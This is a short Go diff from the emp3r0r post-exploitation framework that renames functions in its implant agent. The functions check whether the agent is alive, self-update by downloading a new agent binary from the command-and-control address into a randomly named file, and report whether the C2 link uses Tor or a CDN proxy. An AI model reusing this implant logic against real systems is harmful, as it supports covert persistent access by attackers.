@@ -20,9 +20,9 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
-// is the agent alive?
+// CheckAgentAlive is the agent alive?
 // connect to emp3r0r_def.SocketName, send a message, see if we get a reply
-func IsAgentAlive(c net.Conn) bool {
+func CheckAgentAlive(c net.Conn) bool {
 	logging.Println("Testing if agent is alive...")
 	defer c.Close()
 	ctx, cancel := context.WithCancel(context.Background())
@@ -66,10 +66,10 @@ func IsAgentAlive(c net.Conn) bool {
 	return false
 }
 
-// Upgrade agent from https://ccAddress/agent
-func Upgrade(checksum string) (out string) {
+// AgentUpdate agent from https://ccAddress/agent
+func AgentUpdate(checksum string) (out string) {
 	tempfile := common.RuntimeConfig.AgentRoot + "/" + util.RandStr(util.RandInt(5, 15))
-	_, err := c2transport.SmartDownload("", "agent", tempfile, checksum)
+	_, err := c2transport.FetchFile("", "agent", tempfile, checksum)
 	if err != nil {
 		return fmt.Sprintf("Error: Download agent: %v", err)
 	}
@@ -92,7 +92,7 @@ func Upgrade(checksum string) (out string) {
 }
 
 // set C2Transport string
-func GenC2TransportString() (transport_str string) {
+func genC2TransportString() (transport_str string) {
 	if netutil.IsTor(def.CCAddress) {
 		return fmt.Sprintf("TOR (%s)", def.CCAddress)
 	} else if common.RuntimeConfig.CDNProxy != "" {
